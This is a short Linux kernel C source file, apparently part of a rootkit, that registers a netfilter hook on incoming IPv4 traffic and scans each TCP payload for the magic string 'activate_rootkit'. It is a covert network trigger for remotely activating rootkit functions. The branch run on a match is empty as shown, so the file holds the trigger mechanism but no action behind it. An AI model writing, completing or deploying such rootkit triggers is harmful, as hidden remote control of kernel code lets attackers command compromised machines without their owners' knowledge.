#include "netfilter_trigger.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/string.h>

static struct nf_hook_ops netfilter_ops;

static unsigned int netfilter_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    unsigned char *payload;
    unsigned int payload_len;

    if (!skb)
        return NF_ACCEPT;

    ip_header = ip_hdr(skb);
    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = tcp_hdr(skb);
        payload = (unsigned char *)((unsigned char *)tcp_header + (tcp_header->doff * 4));
        payload_len = skb_tail_pointer(skb) - payload;
        if (payload_len >= 16) {
            if (memcmp(payload, "activate_rootkit", 16) == 0) {
            }
        }
    }
    return NF_ACCEPT;
}

void setup_netfilter_trigger(void) {
    netfilter_ops.hook = netfilter_hookfn;
    netfilter_ops.pf = PF_INET;
    netfilter_ops.hooknum = NF_INET_PRE_ROUTING;
    netfilter_ops.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &netfilter_ops);
}

void cleanup_netfilter_trigger(void) {
    nf_unregister_net_hook(&init_net, &netfilter_ops);
}
